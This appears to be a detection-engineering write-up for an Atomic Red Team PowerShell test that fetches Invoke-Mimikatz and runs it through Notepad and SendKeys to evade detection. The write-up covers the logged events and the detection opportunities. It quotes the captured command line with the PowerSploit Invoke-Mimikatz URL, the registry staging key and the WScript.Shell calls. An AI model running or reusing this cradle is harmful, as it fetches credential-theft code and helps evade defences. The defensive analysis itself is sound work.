# T1059.001-4: PowerShell — Mimikatz Cradlecraft PsSendKeys

## Technique Context

T1059.001 (PowerShell) is the execution technique. This test implements "Cradlecraft PsSendKeys" — an indirect Mimikatz delivery method that downloads the Invoke-Mimikatz script and then executes it not via a direct `IEX` call, but by launching Notepad, writing the script content into the Notepad window through COM-based UI automation (`WScript.Shell.SendKeys`), and then using SendKeys to trigger execution. This indirection is an attempt to bypass detection that monitors PowerShell's network connections or `IEX`-based download cradles by routing the payload through a legitimate application's UI layer.

The technique as designed involves:
1. Fetching `Invoke-Mimikatz.ps1` from `https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1`
2. Saving it to a registry key under `HKCU:\Software\Microsoft\Notepad`
3. Opening Notepad via `Start-Process` and using `SendKeys` to paste and execute the script

The UI-automation angle makes this noisier than a direct download cradle — it spawns Notepad, makes COM calls, and manipulates registry keys — creating a distinct behavioral profile. Detection focuses on: registry writes to `HKCU:\Software\Microsoft\Notepad` containing PowerShell script content, `Notepad.exe` spawning from PowerShell, COM object creation for `WScript.Shell`, and the downstream Mimikatz credential-harvesting behavior.

In defended environments, Defender exits the process with `STATUS_ACCESS_DENIED` (0xC0000022) immediately. This dataset captures the undefended execution.

## What This Dataset Contains

Security EID 4688 records the PowerShell child process with the complete Cradlecraft command line:

```
"powershell.exe" & {$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/
f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';
$wshell=New-Object -ComObject WScript.Shell;
$reg='HKCU:\Software\Microsoft\Notepad';
$app='Notepad';
$props=(Get-ItemProperty $reg); ...}
```

The command line continues through the full UI-automation sequence: setting up registry storage, opening Notepad, and using SendKeys to inject the script. This is a rich artifact: the URL (pinned to a specific commit), the COM object name, the registry path, and the application target all appear in a single EID 4688 event.

Two `whoami.exe` executions from PowerShell are captured in EID 4688.

The PowerShell channel has 96 events (93 EID 4104, 2 EID 4100, 1 EID 4103), consistent with the other tests in this series. The 93 4104 blocks include the full Cradlecraft script content, including the registry manipulation, COM calls, and the Invoke-Mimikatz invocation logic.

Sysmon contributes 19 events across EIDs 7, 1, 10, 17, and 8. EID 1 captures two `whoami.exe` processes. EID 8 shows PowerShell (PID 3652) creating a remote thread in an unknown process (PID 6880, `TargetImage: <unknown process>`, `StartAddress: 0x00007FF77E8753A0`) — the same address pattern seen in tests 18, 5, and 8, suggesting this is ART test framework behavior. EID 10 shows full-access handle opens (0x1FFFFF) from PowerShell (PID 3652) to `whoami.exe` (PID 6644), to a second `whoami.exe` (PID 6276), and to the child PowerShell process (PID 5472). The IDs reflect a more elaborate process tree than simpler tests.

Compared to the defended version (25 sysmon, 9 security, 41 powershell events, 0xC0000022 exit), the undefended version has 19 sysmon, 4 security, and 96 powershell events. The sysmon count is slightly lower because Notepad does not appear in EID 1 — either it wasn't launched (the script exited before reaching that step) or the sysmon-modular configuration filters it out. The key additions are the complete command line in EID 4688 and the 93 script blocks in the PowerShell channel.

## What This Dataset Does Not Contain

No Sysmon EID 1 event for `notepad.exe` — the UI-automation phase may not have executed, or Notepad is filtered from sysmon-modular include rules. No Sysmon EID 13 (RegistryEvent, value set) events appear for the `HKCU:\Software\Microsoft\Notepad` registry writes that would have stored the Invoke-Mimikatz payload. No EID 3 network events for the download of Invoke-Mimikatz.ps1. No downstream Mimikatz artifacts (LSASS access, credential dump output).

The absence of registry and Notepad events means the most distinctive aspect of the Cradlecraft technique — the UI-automation registry trick — is not visible in this dataset's event channels. The technique is documented through the command line, but the registry-write and Notepad-execution stages are not separately recorded.

## Assessment

The primary value of this dataset is the EID 4688 command line and the 4104 script blocks covering the Cradlecraft implementation. The command line alone contains multiple high-confidence indicators: the Invoke-Mimikatz.ps1 URL pinned to a specific commit, `WScript.Shell` COM object creation, and `HKCU:\Software\Microsoft\Notepad` as a payload-staging key. The Sysmon EID 8 CreateRemoteThread event is consistent with the injection-adjacent behavior seen in this ART test series.

## Detection Opportunities Present in This Data

1. EID 4688 containing `https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/.../Invoke-Mimikatz.ps1` — the Invoke-Mimikatz URL pinned to a known-bad commit hash.
2. EID 4688 containing `New-Object -ComObject WScript.Shell` combined with a download URL — COM shell object instantiation in a download context.
3. EID 4688 containing `HKCU:\Software\Microsoft\Notepad` as a registry storage path — use of Notepad's registry key as a staging location for script content.
4. EID 4104 script blocks containing `Invoke-Mimikatz` function invocations — the credential-harvesting function name in script block content.
5. Sysmon EID 8 from `powershell.exe` to `<unknown process>` with start address `0x00007FF77E8753A0` — a recurring pattern across ART PowerShell tests that may reflect test framework-level injection behavior.
6. Sysmon EID 10 `GrantedAccess: 0x1FFFFF` from a parent PowerShell to multiple child processes within a short time window — escalating process access breadth during execution.
7. EID 4688 command line referencing both a remote URL and `$app='Notepad'` — the unusual combination of network payload retrieval with a text-editor application as the execution intermediary.
